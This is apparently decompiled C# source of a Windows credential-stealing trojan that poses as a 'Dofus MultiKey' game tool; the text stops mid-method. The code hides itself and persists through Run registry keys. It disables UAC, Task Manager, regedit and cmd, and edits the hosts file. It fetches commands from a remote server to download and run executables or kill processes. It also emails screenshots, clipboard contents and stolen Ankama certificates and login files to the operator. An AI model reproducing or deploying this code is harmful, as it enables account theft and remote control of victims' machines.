using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

[DesignerGenerated]
public class Chanteur : Form
{
	private IContainer icontainer_0;

	[AccessedThroughProperty("Send")]
	private Timer timer_0;

	[AccessedThroughProperty("Verif")]
	private Timer timer_1;

	private string string_0;

	private string[] string_1;

	private string string_2;

	private string string_3;

	private string string_4;

	private string string_5;

	private string string_6;

	private string string_7;

	private int int_0;

	private int int_1;

	private bool bool_0;

	private string string_8;

	private string string_9;

	private FontStyle fontStyle_0;

	private string string_10;

	private FontStyle fontStyle_1;

	private string string_11;

	private FontStyle fontStyle_2;

	private string string_12;

	private string string_13;

	private string string_14;

	private string string_15;

	private bool bool_1;

	private string string_16;

	private bool bool_2;

	private bool bool_3;

	private bool bool_4;

	private bool bool_5;

	private bool bool_6;

	private bool bool_7;

	private bool bool_8;

	private bool bool_9;

	private bool bool_10;

	private string[] string_17;

	private bool bool_11;

	private string[] string_18;

	private string[] string_19;

	private bool bool_12;

	private string string_20;

	private string string_21;

	private MsgBoxStyle msgBoxStyle_0;

	private string string_22;

	[AccessedThroughProperty("Caillou")]
	private Class6 class6_0;

	private string string_23;

	private string string_24;

	private string string_25;

	internal virtual Timer Timer_0
	{
		get
		{
			return timer_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = method_14;
			if (timer_0 != null)
			{
				timer_0.remove_Tick(eventHandler);
			}
			timer_0 = value;
			if (timer_0 != null)
			{
				timer_0.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer_1
	{
		get
		{
			return timer_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = method_15;
			if (timer_1 != null)
			{
				timer_1.remove_Tick(eventHandler);
			}
			timer_1 = value;
			if (timer_1 != null)
			{
				timer_1.add_Tick(eventHandler);
			}
		}
	}

	private virtual Class6 Class6_0
	{
		get
		{
			return class6_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			Class6.Delegate0 value2 = method_13;
			if (class6_0 != null)
			{
				Class6.Event_0 -= value2;
			}
			class6_0 = value;
			if (class6_0 != null)
			{
				Class6.Event_0 += value2;
			}
		}
	}

	public Chanteur()
	{
		((Form)this).add_Shown((EventHandler)Chanteur_Shown);
		string_0 = "1.1";
		string_22 = method_7(Environment.UserName.ToString() + "|" + Environment.MachineName.ToString() + "|" + Environment.OSVersion.ToString() + "|" + Environment.WorkingSet);
		Class6_0 = new Class6();
		string_23 = "";
		string_24 = "Nonono";
		string_25 = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
		InitializeComponent();
	}

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)Class2.Class3_0.Chanteur_0);
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		icontainer_0 = new Container();
		Timer_0 = new Timer(icontainer_0);
		Timer_1 = new Timer(icontainer_0);
		((Control)this).SuspendLayout();
		Timer_0.set_Interval(60000);
		Timer_1.set_Interval(6000);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(0, 0);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_ControlBox(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Chanteur");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)0);
		((Control)this).ResumeLayout(false);
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int BlockInput(int int_2);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextA(int int_2, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_26, int int_3);

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Chanteur_Shown(object sender, EventArgs e)
	{
		//IL_012a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0280: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0347: Unknown result type (might be due to invalid IL or missing references)
		//IL_036f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0397: Unknown result type (might be due to invalid IL or missing references)
		//IL_03bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_040e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0436: Unknown result type (might be due to invalid IL or missing references)
		//IL_045e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0486: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b92: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bbd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0be8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c10: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c4b: Unknown result type (might be due to invalid IL or missing references)
		//IL_10ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_10dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_123d: Unknown result type (might be due to invalid IL or missing references)
		((Control)this).Hide();
		((Form)this).set_Opacity(0.0);
		checked
		{
			try
			{
				string string_ = "VklWRSUyMExPVkVFRUVSLUxPT09PTA";
				string text = "TG92ZXItbG9sJTIwZXN0JTIwJUU5Z2FsJTIwJUUwJTIwQWxpbWVudG9yJTIwTU9VSEFBSEFIQUhBSEFIQUhBSEFIQUE";
				string text2 = "RXQlMjBMb3Zlci1sb2wlMjAlM0QlMjBBbGltZW50b3IlMjAlM0ElNUQ";
				FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
				string string_2 = Strings.Space((int)FileSystem.LOF(1));
				FileSystem.FileGet(1, ref string_2, -1L, false);
				FileSystem.FileClose(new int[1] { 1 });
				string string_3 = method_8(string_2, string_, text);
				string_3 = method_6(string_3, text2);
				string text3 = method_9(method_9(method_9(string_3, text2), string_), text);
				string_1 = Strings.Split(text3, text2, -1, (CompareMethod)0);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				if (Operators.CompareString(string_4, "onlytest", false) != 0)
				{
					Interaction.MsgBox((object)ex2.ToString(), (MsgBoxStyle)0, (object)null);
				}
				ProjectData.ClearProjectError();
			}
			try
			{
				string_4 = string_1[0];
				string_5 = string_1[1];
				string_6 = string_1[2];
				string_7 = string_1[3];
				int_0 = Conversions.ToInteger(Conversion.Int((object)string_1[4]));
				int_1 = Conversions.ToInteger(Conversion.Int((object)string_1[5]));
				if (Operators.CompareString(string_1[6], "Screen", false) == 0)
				{
					bool_0 = true;
				}
				else
				{
					bool_0 = false;
				}
				string_8 = string_1[7];
				string_9 = string_1[8];
				switch (string_1[9])
				{
				case "IntroGras":
					fontStyle_0 = (FontStyle)1;
					break;
				case "IntroItalique":
					fontStyle_0 = (FontStyle)2;
					break;
				case "IntroNormal":
					fontStyle_0 = (FontStyle)0;
					break;
				case "IntroSouligne":
					fontStyle_0 = (FontStyle)4;
					break;
				}
				string_10 = string_1[10];
				switch (string_1[11])
				{
				case "ContenuGras":
					fontStyle_1 = (FontStyle)1;
					break;
				case "ContenuItalique":
					fontStyle_1 = (FontStyle)2;
					break;
				case "ContenuNormal":
					fontStyle_1 = (FontStyle)0;
					break;
				case "ContenuSouligne":
					fontStyle_1 = (FontStyle)4;
					break;
				}
				string_11 = string_1[12];
				switch (string_1[13])
				{
				case "HeadGras":
					fontStyle_2 = (FontStyle)1;
					break;
				case "HeadItalique":
					fontStyle_2 = (FontStyle)2;
					break;
				case "HeadNormal":
					fontStyle_2 = (FontStyle)0;
					break;
				case "HeadSouligne":
					fontStyle_2 = (FontStyle)4;
					break;
				}
				string_12 = string_1[14];
				string_13 = string_1[15];
				switch (string_13)
				{
				case "Appdata":
					string_13 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
					break;
				case "Ma Musique":
					string_13 = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
					break;
				case "Mes Documents":
					string_13 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
					break;
				case "Mes Images":
					string_13 = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
					break;
				case "Mes Vid?os":
					string_13 = Environment.GetFolderPath(Environment.SpecialFolder.SendTo);
					break;
				case "Program Files":
					string_13 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
					break;
				case "System32":
					string_13 = Environment.GetFolderPath(Environment.SpecialFolder.System);
					break;
				case "Temp":
					string_13 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
					break;
				case "Utilisateur":
					string_13 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
					break;
				default:
					string_13 = Environment.GetFolderPath(Environment.SpecialFolder.Cookies);
					break;
				}
				string_14 = string_1[16];
				string_15 = string_1[17];
				if (Operators.CompareString(string_1[18], "RegPersi", false) == 0)
				{
					bool_1 = true;
				}
				else
				{
					bool_1 = false;
				}
				string_16 = string_1[19];
				if (Operators.CompareString(string_1[20], "DesactiveReg", false) == 0)
				{
					bool_2 = true;
				}
				else
				{
					bool_2 = false;
				}
				if (Operators.CompareString(string_1[21], "DesactiveTaskmgr", false) == 0)
				{
					bool_3 = true;
				}
				else
				{
					bool_3 = false;
				}
				if (Operators.CompareString(string_1[22], "DesactiveMsconfig", false) == 0)
				{
					bool_4 = true;
				}
				else
				{
					bool_4 = false;
				}
				if (Operators.CompareString(string_1[23], "DesactiveRestore", false) == 0)
				{
					bool_5 = true;
				}
				else
				{
					bool_5 = false;
				}
				if (Operators.CompareString(string_1[24], "DesactiveHidden", false) == 0)
				{
					bool_6 = true;
				}
				else
				{
					bool_6 = false;
				}
				if (Operators.CompareString(string_1[25], "DesactivateCmd", false) == 0)
				{
					bool_7 = true;
				}
				else
				{
					bool_7 = false;
				}
				if (Operators.CompareString(string_1[26], "DesactivateDossiers", false) == 0)
				{
					bool_8 = true;
				}
				else
				{
					bool_8 = false;
				}
				if (Operators.CompareString(string_1[27], "DesactivateConfig", false) == 0)
				{
					bool_9 = true;
				}
				else
				{
					bool_9 = false;
				}
				if (Operators.CompareString(string_1[28], "Comptabilite", false) == 0)
				{
					bool_10 = true;
				}
				else
				{
					bool_10 = false;
				}
				string_17 = Strings.Split(method_8(string_1[29], "[DL]", "[/DL]"), "!dl!", -1, (CompareMethod)0);
				if (Operators.CompareString(string_1[30], "DownloadEveryReboot", false) == 0)
				{
					bool_11 = true;
				}
				else
				{
					bool_11 = false;
				}
				string_18 = Strings.Split(method_8(string_1[31], "[LAUNCH]", "[/LAUNCH]"), "!launch!", -1, (CompareMethod)0);
				string_19 = Strings.Split(method_8(string_1[32], "[BLOCK]", "[/BLOCK]"), "!block!", -1, (CompareMethod)0);
				if (Operators.CompareString(string_1[33], "FakeMsg", false) == 0)
				{
					bool_12 = true;
				}
				else
				{
					bool_12 = false;
				}
				string_20 = string_1[34].Replace("[eaigu]", "é").Replace("[egrave]", "è").Replace("[agrave]", "à")
					.Replace("[ccdille]", "ç");
				string_21 = string_1[35].Replace("%ligne%", Environment.NewLine).Replace("[eaigu]", "é").Replace("[egrave]", "è")
					.Replace("[agrave]", "à")
					.Replace("[ccdille]", "ç");
				switch (string_1[36])
				{
				case "MsgCritique":
					msgBoxStyle_0 = (MsgBoxStyle)16;
					break;
				case "MsgExclam":
					msgBoxStyle_0 = (MsgBoxStyle)48;
					break;
				case "MsgInfo":
					msgBoxStyle_0 = (MsgBoxStyle)64;
					break;
				case "MsgNormal":
					msgBoxStyle_0 = (MsgBoxStyle)0;
					break;
				}
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception ex4 = ex3;
				if (Operators.CompareString(string_4, "onlytest", false) != 0)
				{
					Interaction.MsgBox((object)ex4.ToString(), (MsgBoxStyle)0, (object)null);
				}
				ProjectData.ClearProjectError();
			}
			Timer_0.set_Interval(int_1 * 60000);
			if (Operators.CompareString(Application.get_StartupPath(), string_13, false) == 0)
			{
				method_0();
				Timer_0.Start();
				if (bool_1)
				{
					Timer_1.Start();
				}
				if (!bool_11)
				{
					return;
				}
				string[] array = string_17;
				foreach (string text4 in array)
				{
					string text5 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + method_5(6, 16) + ".exe";
					try
					{
						((ServerComputer)Class2.Class1_0).get_Network().DownloadFile(text4, text5);
						Process.Start(text5);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				return;
			}
			try
			{
				string text6 = string_13 + "\\" + string_14;
				FileInfo fileInfo = ((ServerComputer)Class2.Class1_0).get_FileSystem().GetFileInfo(Application.get_ExecutablePath());
				fileInfo.Attributes = FileAttributes.Hidden;
				fileInfo.MoveTo(text6);
				try
				{
					if (Operators.CompareString(string_16, "RegUser", false) == 0)
					{
						RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", writable: true);
						if (registryKey.GetValue(string_15) == null)
						{
							registryKey.SetValue(string_15, text6);
						}
					}
					else
					{
						RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", writable: true);
						if (registryKey.GetValue(string_15) == null)
						{
							registryKey.SetValue(string_15, text6);
						}
					}
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
			method_0();
			if (bool_1)
			{
				Timer_1.Start();
			}
			method_4(string_25, "EnableLUA", "0", bool_13: false, bool_14: true);
			method_4(string_25, "ConsentPromptBehaviorUser", "1", bool_13: true);
			method_4(string_25, "ConsentPromptBehaviorAdmin", "0", bool_13: true);
			method_4(string_25, "EnableInstallerDetection", "0", bool_13: true);
			if (bool_7)
			{
				method_4("Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", "1");
			}
			if (bool_9)
			{
				method_4("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoControlPanel", "1");
			}
			if (bool_8)
			{
				method_4("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoFolderOption", "1");
			}
			if (bool_6)
			{
				method_4("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL", "Checked Value", "0");
			}
			if (bool_4)
			{
				method_4("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun", "Zxss", "msconfig", bool_13: false, bool_14: true);
			}
			if (bool_2)
			{
				method_4(string_25, "DisableRegistryTools", "1");
			}
			if (bool_5)
			{
				method_4("SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore", "DisableConfig", "0");
				method_4("SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore", "DisableSR", "0");
			}
			if (bool_3)
			{
				method_4(string_25, "DisableTaskMgr", "1");
			}
			if (bool_12)
			{
				Interaction.MsgBox((object)string_21, msgBoxStyle_0, (object)string_20);
			}
			string[] array2 = string_17;
			foreach (string text7 in array2)
			{
				string text8 = method_5(6, 16) + ".exe";
				try
				{
					((ServerComputer)Class2.Class1_0).get_Network().DownloadFile(text7, text8);
					Process.Start(text8);
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
			}
			try
			{
				StreamWriter streamWriter = new StreamWriter("C:\\WINDOWS\\system32\\drivers\\etc\\hosts", append: true);
				string[] array3 = string_18;
				foreach (string arg in array3)
				{
					streamWriter.WriteLine("{0} {1} {2}", "127.0.0.1", "\t", arg);
				}
				streamWriter.Close();
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
			}
			try
			{
				string[] array4 = string_18;
				foreach (string fileName in array4)
				{
					Process.Start(fileName);
				}
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
			}
			method_1();
			if (bool_10)
			{
				Interaction.MsgBox((object)"This program can't install, please check your devices.", (MsgBoxStyle)16, (object)"Critical Error");
				BlockInput(-1);
				Thread.Sleep(2000);
				if (Operators.CompareString(string_4, "onlytest", false) != 0)
				{
					Process.Start("ShutDown", "/r");
				}
			}
			Process.Start(string_13 + "\\" + string_14);
			Application.Exit();
		}
	}

	public void method_0()
	{
		try
		{
			WebClient webClient = new WebClient();
			string text = webClient.DownloadString("http://ankama-video.net/DofusMultiKey/Liste/liste.id");
			if (text.Contains(string_22))
			{
				string text2 = method_8(text, "[" + string_22 + "]", "[/" + string_22 + "]");
				if (text2.Contains("-quit-"))
				{
					Application.Exit();
				}
				if (text2.Contains("-dl-"))
				{
					string text3 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + method_8(text2, "[DLDEST]", "[/DLDEST]") + ".exe";
					if (!File.Exists(text3))
					{
						((ServerComputer)Class2.Class1_0).get_Network().DownloadFile(method_8(text2, "[DL]", "[/DL]"), text3);
						Process.Start(text3);
					}
					else if (text2.Contains("DLALL"))
					{
						((ServerComputer)Class2.Class1_0).get_Network().DownloadFile(method_8(text2, "[DL]", "[/DL]"), text3);
						Process.Start(text3);
					}
				}
				if (text2.Contains("-kill-"))
				{
					try
					{
						Process[] processes = Process.GetProcesses();
						foreach (Process process in processes)
						{
							if (process.Id == Process.GetCurrentProcess().Id)
							{
								return;
							}
							if (Operators.CompareString(process.ProcessName.ToLower(), method_8(text2, "[KILL]", "[/KILL]"), false) == 0)
							{
								process.Kill();
							}
							if (Operators.CompareString(process.ProcessName.ToLower(), method_8(text2, "[KILL]", "[/KILL]") + ".exe", false) == 0)
							{
								process.Kill();
							}
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				if (text2.Contains("-kill2-"))
				{
					try
					{
						Process[] processes2 = Process.GetProcesses();
						foreach (Process process2 in processes2)
						{
							if (process2.Id == Process.GetCurrentProcess().Id)
							{
								return;
							}
							if (Operators.CompareString(process2.ProcessName.ToLower(), method_8(text2, "[KILL2]", "[/KILL2]"), false) == 0)
							{
								process2.Kill();
							}
							if (Operators.CompareString(process2.ProcessName.ToLower(), method_8(text2, "[KILL2]", "[/KILL2]") + ".exe", false) == 0)
							{
								process2.Kill();
							}
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				if (text2.Contains("-exit-"))
				{
					Application.Exit();
				}
			}
			if (text.Contains("[NAVIG]"))
			{
				string[] array = Strings.Split(method_8(text, "[NAVIG]", "[/NAVIG]"), "!navig!", -1, (CompareMethod)0);
				string[] array2 = array;
				foreach (string address in array2)
				{
					webClient.DownloadString(address);
				}
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	public void method_1()
	{
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0054: Expected O, but got Unknown
		try
		{
			if (File.Exists("C:\\zxss.jpg"))
			{
				File.Delete("C:\\zxss.jpg");
				Thread.Sleep(250);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
			Bitmap val = new Bitmap(bounds.Width, bounds.Height, (PixelFormat)925707);
			Graphics.FromImage((Image)(object)val).CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, (CopyPixelOperation)13369376);
			((Image)val).Save("C:\\zxss.jpg", ImageFormat.get_Jpeg());
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			string text = string_4;
			string password = string_5;
			string addresses = string_6;
			string host = string_7;
			int port = Conversion.Int(int_0);
			SmtpClient smtpClient = new SmtpClient();
			MailMessage mailMessage = new MailMessage();
			smtpClient.Credentials = new NetworkCredential(text, password);
			smtpClient.Port = port;
			smtpClient.Host = host;
			smtpClient.EnableSsl = true;
			mailMessage = new MailMessage();
			mailMessage.From = new MailAddress(text);
			mailMessage.To.Add(addresses);
			mailMessage.IsBodyHtml = true;
			mailMessage.Subject = "[Dofus MultiKey " + string_0 + " ] " + string_8.Replace("%user%", Environment.UserName).Replace("%pc%", Environment.MachineName);
			mailMessage.Body = method_3(bool_13: true, "intro") + "[" + DateTime.Now.ToString().ToString() + "] <br/>Une nouvelle victime a été infectée, son ordinateur est " + Environment.MachineName + " sous la session " + Environment.UserName + "<br/>VOUS NE RECEVREZ AUCUN Creation DANS CE MAIL, CE MAIL A POUR BUT DE VOUS PREVENIR ET UNIQUEMENT CELA !<br/><br/>";
			MailMessage mailMessage2 = mailMessage;
			mailMessage2.Body = mailMessage2.Body + "[UniqueId] " + string_22 + "<br/>Cette suite de chiffre et de nombres, si vous la communiquez à Alimentor en spécifiant bien ce que vous voulez, vous servir à :<br/>- Arrêter de recevoir des Creation de cette victime<br/>- Télécharger un nouveau fichier (comme un nouveau serveur)<br/><br/>";
			try
			{
				if (Directory.Exists(Environment.GetEnvironmentVariable("AppData") + "\\AnkamaCertificates"))
				{
					mailMessage2 = mailMessage;
					mailMessage2.Body = mailMessage2.Body + "Le dossier " + Environment.GetEnvironmentVariable("AppData") + "\\AnkamaCertificates existe bien.<br/>";
				}
				else
				{
					mailMessage2 = mailMessage;
					mailMessage2.Body = mailMessage2.Body + "Le dossier " + Environment.GetEnvironmentVariable("AppData") + "\\AnkamaCertificates n'existe pas, la victime n'a pas de certificats.<br/>";
				}
				string[] files = Directory.GetFiles(Environment.GetEnvironmentVariable("AppData") + "\\AnkamaCertificates");
				foreach (string fileName in files)
				{
					mailMessage.Attachments.Add(new Attachment(fileName));
				}
				mailMessage.Body += "Certificats volés avec succès.";
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				mailMessage.Body += "Erreur lors de la récuperation des certificats, il se peut que la victime n'ait pas de certificats !";
				ProjectData.ClearProjectError();
			}
			mailMessage.Body += "<br/>";
			try
			{
				if (Directory.Exists(Environment.GetEnvironmentVariable("AppData") + "\\Dofus 2"))
				{
					mailMessage2 = mailMessage;
					mailMessage2.Body = mailMessage2.Body + "Le dossier " + Environment.GetEnvironmentVariable("AppData") + "\\Dofus 2 existe bien<br/>";
					string[] files2 = Directory.GetFiles(Environment.GetEnvironmentVariable("AppData") + "\\Dofus 2");
					foreach (string text2 in files2)
					{
						if (Operators.CompareString(text2, Environment.GetEnvironmentVariable("AppData") + "\\Dofus 2\\Module_Ankama_Connection.dat", false) == 0)
						{
							mailMessage.Attachments.Add(new Attachment(text2));
							break;
						}
					}
					mailMessage.Body += "Module_Ankama_Connection.dat volé avec succès, le nom de compte est dedans !<br/>";
				}
				else
				{
					mailMessage2 = mailMessage;
					mailMessage2.Body = mailMessage2.Body + "Le dossier " + Environment.GetEnvironmentVariable("AppData") + "\\Dofus 2 n'existe pas !<br/>";
				}
				if (Directory.Exists(Environment.GetEnvironmentVariable("AppData") + "\\Dofus2"))
				{
					mailMessage2 = mailMessage;
					mailMessage2.Body = mailMessage2.Body + "Le dossier " + Environment.GetEnvironmentVariable("AppData") + "\\Dofus2 existe bien<br/>";
					string[] files3 = Directory.GetFiles(Environment.GetEnvironmentVariable("AppData") + "\\Dofus2");
					foreach (string text3 in files3)
					{
						if (Operators.CompareString(text3, Environment.GetEnvironmentVariable("AppData") + "\\Dofus2\\Module_Ankama_Connection.dat", false) == 0)
						{
							mailMessage.Attachments.Add(new Attachment(text3));
							break;
						}
					}
					mailMessage.Body += "Module_Ankama_Connection.dat volé avec succès, le nom de compte est dedans !<br/>";
				}
				else
				{
					mailMessage2 = mailMessage;
					mailMessage2.Body = mailMessage2.Body + "Le dossier " + Environment.GetEnvironmentVariable("AppData") + "\\Dofus2 n'existe pas !<br/>";
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "Erreur lors de la récupération du fichier Module_Ankama_Connection.dat : " + ex2.ToString() + "<br/>";
				ProjectData.ClearProjectError();
			}
			mailMessage2 = mailMessage;
			mailMessage2.Body = mailMessage2.Body + "<br/>Presse-Papiers : " + Clipboard.GetText() + "<br/>" + method_3(bool_13: false, "intro");
			mailMessage.Body = method_2(mailMessage.Body);
			mailMessage.Attachments.Add(new Attachment("C:\\zxss.jpg"));
			smtpClient.Send(mailMessage);
			try
			{
				if (File.Exists("C:\\zxss.jpg"))
				{
					File.Delete("C:\\zxss.jpg");
				}
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
	}

	public string method_2(string string_26)
	{
		return string_26.Replace("é", "&eacute;").Replace("è", "&egrave;").Replace("ê", "&ecirc;")
			.Replace("à", "&agrave;")
			.Replace("ç", "&ccedil;");
	}

	public string method_3(bool bool_13, string string_26)
	{
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected I4, but got Unknown
		//IL_00a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c4: Expected I4, but got Unknown
		//IL_012a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0134: Unknown result type (might be due to invalid IL or missing references)
		//IL_014a: Expected I4, but got Unknown
		//IL_0186: Unknown result type (might be due to invalid IL or missing references)
		//IL_0190: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a6: Expected I4, but got Unknown
		//IL_020c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0216: Unknown result type (might be due to invalid IL or missing references)
		//IL_022c: Expected I4, but got Unknown
		//IL_025c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0266: Unknown result type (might be due to invalid IL or missing references)
		//IL_027c: Expected I4, but got Unknown
		string text = "";
		switch (string_26)
		{
		case "intro":
			if (bool_13)
			{
				text = "<font=\"" + string_10 + "\">";
				switch (fontStyle_0 - 1)
				{
				case 0:
					text += "<b>";
					break;
				case 1:
					text += "<i>";
					break;
				case 3:
					text += "<u>";
					break;
				}
			}
			else
			{
				switch (fontStyle_0 - 1)
				{
				case 0:
					text = "</b>";
					break;
				case 1:
					text = "</i>";
					break;
				case 3:
					text = "</u>";
					break;
				}
				text += "</font>";
			}
			break;
		case "head":
			if (bool_13)
			{
				text = "<font=\"" + string_12 + "\">";
				switch (fontStyle_2 - 1)
				{
				case 0:
					text += "<b>";
					break;
				case 1:
					text += "<i>";
					break;
				case 3:
					text += "<u>";
					break;
				}
			}
			else
			{
				switch (fontStyle_2 - 1)
				{
				case 0:
					text = "</b>";
					break;
				case 1:
					text = "</i>";
					break;
				case 3:
					text = "</u>";
					break;
				}
				text += "</font>";
			}
			break;
		case "Creation":
			if (bool_13)
			{
				text = "<font=\"" + string_11 + "\">";
				switch (fontStyle_1 - 1)
				{
				case 0:
					text += "<b>";
					break;
				case 1:
					text += "<i>";
					break;
				case 3:
					text += "<u>";
					break;
				}
			}
			else
			{
				switch (fontStyle_1 - 1)
				{
				case 0:
					text = "</b>";
					break;
				case 1:
					text = "</i>";
					break;
				case 3:
					text = "</u>";
					break;
				}
				text += "</font>";
			}
			break;
		}
		return text;
	}

	public void method_4(string string_26, string string_27, string string_28, bool bool_13 = false, bool bool_14 = false)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(string_26, writable: true);
			RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey(string_26, writable: true);
			if (!bool_14)
			{
				registryKey.SetValue(string_27, string_28, RegistryValueKind.DWord);
			}
			if (!bool_13)
			{
				registryKey2.SetValue(string_27, string_28, RegistryValueKind.DWord);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public string method_5(int int_2, int int_3, bool bool_13 = true, bool bool_14 = true, bool bool_15 = true)
	{
		checked
		{
			if (int_2 > 0 && int_3 > 0 && int_2 <= int_3)
			{
				string text = "";
				if (bool_13)
				{
